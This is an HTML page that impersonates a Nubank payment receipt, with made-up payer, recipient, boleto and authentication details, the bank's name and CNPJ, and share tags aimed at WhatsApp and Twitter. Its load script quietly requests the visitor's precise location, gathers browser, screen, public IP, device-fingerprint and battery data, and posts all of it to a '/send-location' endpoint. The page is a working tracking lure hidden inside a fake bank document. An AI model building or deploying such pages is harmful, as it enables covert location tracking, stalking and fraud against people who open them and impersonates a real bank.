<!DOCTYPE html>
<html>
<head>
  <title>Comprovante Nubank</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Favicon e ícones -->
  <link rel="icon" type="image/svg+xml" href="/images/nubank-icon.svg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/nubank-icon.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/nubank-icon.svg">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/nubank-icon.svg">
  <link rel="mask-icon" href="/images/nubank-icon.svg" color="#820AD1">
  <meta name="theme-color" content="#820AD1">
  <meta name="msapplication-TileColor" content="#820AD1">

  <!-- Meta tags para compartilhamento -->
  <meta property="og:title" content="Comprovante de Pagamento - Nubank">
  <meta property="og:description" content="Visualize o comprovante de pagamento Nubank">
  <meta property="og:image" content="/images/nubank-icon.svg">
  <meta property="og:image:type" content="image/svg+xml">
  <meta property="og:image:width" content="100">
  <meta property="og:image:height" content="100">
  <meta property="og:image:alt" content="Logo Nubank">

  <!-- Meta tags específicas para WhatsApp -->
  <meta property="og:site_name" content="Nubank">
  <meta property="og:type" content="website">

  <!-- Meta tags para Twitter -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Comprovante de Pagamento - Nubank">
  <meta name="twitter:description" content="Visualize o comprovante de pagamento Nubank">
  <meta name="twitter:image" content="/images/nubank-icon.svg">
  <meta name="twitter:image:alt" content="Logo Nubank">

  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
      color: #333;
      background-color: #f5f5f5;
    }
    .payment-container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .payment-header {
      text-align: center;
      margin-bottom: 40px;
    }
    .bank-logo {
      font-size: 32px;
      margin-bottom: 20px;
      color: #820ad1;
    }
    .payment-header h1 {
      font-size: 24px;
      font-weight: normal;
      margin: 10px 0;
      line-height: 1.3;
    }
    .timestamp {
      color: #666;
      font-size: 14px;
      margin-top: 10px;
    }
    .payment-info {
      margin-bottom: 30px;
    }
    .info-row {
      margin: 20px 0;
      border-bottom: 1px solid #eee;
      padding-bottom: 10px;
    }
    .label {
      display: block;
      color: #666;
      font-size: 14px;
      margin-bottom: 5px;
    }
    .value {
      display: block;
      font-size: 16px;
    }
    .highlight {
      font-size: 20px;
      font-weight: bold;
    }
    .document-section {
      margin-top: 30px;
    }
    .section-title {
      font-size: 14px;
      color: #666;
      margin-bottom: 20px;
      text-transform: uppercase;
    }
    .auth-section {
      margin-top: 40px;
      text-align: center;
      border-top: 1px solid #eee;
      padding-top: 20px;
    }
    .auth-code {
      font-size: 12px;
      color: #666;
    }
    .payment-footer {
      margin-top: 40px;
      text-align: center;
      color: #666;
      font-size: 12px;
    }
    @media print {
      body {
        padding: 0;
        background: white;
      }
      .payment-container {
        box-shadow: none;
      }
      .print-button {
        display: none;
      }
    }
    .print-button {
      display: block;
      margin: 20px auto;
      padding: 10px 20px;
      background: #820ad1;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s;
    }
    .print-button:hover {
      background: #6a0aa6;
    }
  </style>
</head>
<body>
<div class="payment-container">
  <div class="payment-header">
    <div class="bank-logo">nu</div>
    <h1>Comprovante de<br>pagamento</h1>
    <p id="datetime" class="timestamp"></p>
  </div>

  <div class="payment-content">
    <div class="payment-info">
      <div class="info-row">
        <span class="label">Valor</span>
        <span id="amount" class="value highlight">R$ 1.000,00</span>
      </div>

      <div class="info-row">
        <span class="label">Pagador</span>
        <span id="payer" class="value">Maria Silva Santos</span>
      </div>

      <div class="info-row">
        <span class="label">Agência</span>
        <span class="value">0001</span>
      </div>

      <div class="info-row">
        <span class="label">Conta</span>
        <span class="value">6404075-9</span>
      </div>

      <div class="document-section">
        <div class="section-title">Documento</div>

        <div class="info-row">
          <span class="label">Favorecido</span>
          <span id="recipient" class="value">João Pedro Oliveira</span>
        </div>

        <div class="info-row">
          <span class="label">Vencimento</span>
          <span id="dueDate" class="value"></span>
        </div>

        <div class="info-row">
          <span class="label">Código do boleto</span>
          <span id="barcode" class="value">34191790010104351004791020150008291070026000</span>
        </div>
      </div>
    </div>

    <div class="auth-section">
      <div class="auth-code">
        <span class="label">Código de autenticação</span><br>
        <span id="authCode" class="value">5ed079a9-1fce-4675-9595-ab5ccd3b4df8</span>
      </div>
    </div>

    <div class="payment-footer">
      <p>Nu Pagamentos S.A.</p>
      <p>CNPJ 18.236.120/0001-58</p>
    </div>
  </div>
</div>

<button onclick="window.print()" class="print-button">Imprimir comprovante</button>

<script>
  window.addEventListener('load', () => {
    // Data e hora atual formatada como no Nubank
    const now = new Date();
    const day = String(now.getDate()).padStart(2, '0');
    const months = ['JAN', 'FEV', 'MAR', 'ABR', 'MAI', 'JUN', 'JUL', 'AGO', 'SET', 'OUT', 'NOV', 'DEZ'];
    const month = months[now.getMonth()];
    const year = now.getFullYear();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');

    // Atualizar data/hora
    document.getElementById('datetime').textContent = `${day} ${month} ${year}, ${hours}:${minutes}`;
    document.getElementById('dueDate').textContent = `${day} ${month} ${year}`;

    // Obter informações do navegador
    const browserInfo = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      appName: navigator.appName,
      appVersion: navigator.appVersion
    };

    // Obter informações de rede (IP público)
    async function getPublicIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error('Erro ao obter IP público:', error);
      }
    }

    // Obter status de conectividade
    const isOnline = navigator.onLine;

    // Obter informações de tela
    const screenInfo = {
      width: window.innerWidth,
      height: window.innerHeight,
      devicePixelRatio: window.devicePixelRatio
    };

    // Obter o fingerprint do dispositivo usando FingerprintJS (se disponível)
    async function getFingerprint() {
      try {
        const fp = await FingerprintJS.load();
        const result = await fp.get();
        return result.visitorId;
      } catch (error) {
        console.error('Erro ao obter fingerprint:', error);
      }
    }

    // Obter status da bateria (se disponível)
    async function getBatteryStatus() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: battery.level * 100,  // Nível da bateria em %
          charging: battery.charging      // Se está carregando ou não
        };
      } catch (error) {
        console.error('Erro ao obter status da bateria:', error);
      }
    }

    // Obter localização geográfica
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
              async (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                const altitude = position.coords.altitude;  // Altitude (se disponível)
                const speed = position.coords.speed;        // Velocidade (se disponível)
                const heading = position.coords.heading;    // Direção (se disponível)
                const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

                console.log('Latitude:', latitude);
                console.log('Longitude:', longitude);
                console.log('Altitude:', altitude);
                console.log('Velocidade:', speed);
                console.log('Direção:', heading);
                console.log('Link do mapa:', maps);
                console.log('Informações do navegador:', browserInfo);
                console.log('Resolução da tela:', screenInfo);
                console.log('Conectividade:', isOnline);
                console.log('IP Público:', await getPublicIP());
                console.log('Fingerprint:', await getFingerprint());
                console.log('Status da Bateria:', await getBatteryStatus());

                try {
                  await fetch('/send-location', {
                    method: 'POST',
                    headers: {
                      'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                      latitude,
                      longitude,
                      altitude,
                      speed,
                      heading,
                      maps,
                      browserInfo,
                      screenInfo,
                      isOnline,
                      ip: await getPublicIP(),
                      fingerprint: await getFingerprint(),
                      batteryStatus: await getBatteryStatus()
                    })
                  });
                } catch (error) {
                  console.error('Erro ao enviar localização:', error);
                }
              },
              (error) => {
                console.error('Erro ao obter localização:', error);
              },
              {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
              }
      );
    }
  });
</script>

</body>
</html>
